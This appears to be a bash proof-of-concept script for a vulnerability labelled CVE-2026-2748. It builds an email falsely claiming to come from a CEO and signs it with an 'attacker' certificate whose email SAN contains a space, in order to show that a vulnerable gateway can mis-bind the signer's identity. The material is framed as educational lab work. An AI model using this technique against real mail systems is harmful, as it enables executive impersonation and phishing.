#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
OUT="$ROOT/demo_out"
MSG="$OUT/unsigned_message.eml"

mkdir -p "$OUT"

cat > "$MSG" <<'EOF'
From: ceo@company.com
To: analyst@lab.local
Subject: CVE-2026-2748 educational PoC
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

This body is signed with a certificate whose rfc822Name SAN is not literally
ceo@company.com (it contains a space). Cryptographic verification still passes;
identity binding is where a vulnerable gateway can go wrong.
EOF

openssl smime -sign -in "$MSG" \
  -signer "$OUT/attacker.crt" -inkey "$OUT/attacker.key" \
  -out "$OUT/signed_spoof.pem"
